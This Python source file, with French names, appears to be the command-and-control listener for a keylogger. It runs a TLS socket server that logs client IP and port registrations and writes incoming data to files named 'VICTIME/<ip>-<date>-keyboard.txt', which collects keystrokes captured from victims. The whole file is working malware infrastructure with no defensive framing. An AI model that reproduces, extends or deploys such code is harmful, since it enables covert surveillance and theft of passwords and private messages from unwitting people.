import socket
import ssl
from datetime import datetime
import socket
from .Verification import VérificationClientFichier

def Ecoute(PORT):

    IP = '127.0.0.1'

    ServeurSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    ServeurSocket.bind((IP, PORT))

    ServeurSocket.listen(1)
    print(f"Serveur en écoute sur {IP}:{PORT}")

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

    context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    while True:
        ClientSocket, ClientAdresse = ServeurSocket.accept()

        SecureClientSocket = context.wrap_socket(ClientSocket, server_side=True)

        print(f"Connexion établie avec {ClientAdresse}")

        try:
            if ClientAdresse:
                IPClient = ClientAdresse[0]
                VérificationClientFichier(IPClient)

            Data = SecureClientSocket.recv(4096).decode('utf-8', 'ignore')
            if Data.endswith("\\ADRESSEIPPORT"):
                IPPORT = Data.split("\\")[0]
                with open(f"clients.txt", "a+") as client_file:
                    client_file.write(IPPORT + "\n")
                print(f"Adresse IP et PORT du client enregistrés : {IPPORT}")
            else:
                while True:
                    if not Data:
                        break
                    print(f"Données reçues du client : {Data}")
                    IPClient = ClientAdresse[0]
                    date_now = datetime.now().strftime("%d-%m-%Y")
                    filename = f"VICTIME/{IPClient}-{date_now}-keyboard.txt"
                    with open(filename, "a") as fichier:
                        fichier.write(Data)
                        break

        except KeyboardInterrupt:
            print("Arrêt du serveur.")
            break

        finally:
            SecureClientSocket.close()


    ServeurSocket.close()
